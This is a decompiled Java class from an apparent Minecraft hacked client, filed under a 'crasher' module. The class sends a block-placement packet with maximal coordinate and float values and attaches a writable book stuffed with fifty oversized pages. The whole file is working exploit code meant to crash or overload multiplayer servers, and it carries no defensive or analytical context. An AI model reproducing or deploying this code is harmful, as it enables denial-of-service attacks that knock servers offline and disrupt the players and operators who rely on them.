// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.bp;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.client.Minecraft;
import net.minecraft.util.math.BlockPos;

public class BlockPlaceCrasher2
{
    public static void start() {
        final BlockPos pos = new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(pos, Integer.MAX_VALUE, bigBook(), Float.MAX_VALUE, 1.0f, Float.MAX_VALUE));
    }
    
    public static ItemStack bigBook() {
        final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound bookCompound = new NBTTagCompound();
        Minecraft.getMinecraft();
        final String author = Minecraft.getSession().getUsername();
        final String title = "Play with me.";
        final String size = "4567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972456723856784567894567895678298456789018745678902456781546789406734573937463249324634846543843654237645238645364523476325487234532489724567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972";
        bookCompound.setString("author", author);
        bookCompound.setString("title", title);
        final NBTTagList pageList = new NBTTagList();
        final String pageText = size;
        for (int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString(pageText));
        }
        bookCompound.setTag("pages", pageList);
        itemStack.setTagCompound(bookCompound);
        return itemStack;
    }
}
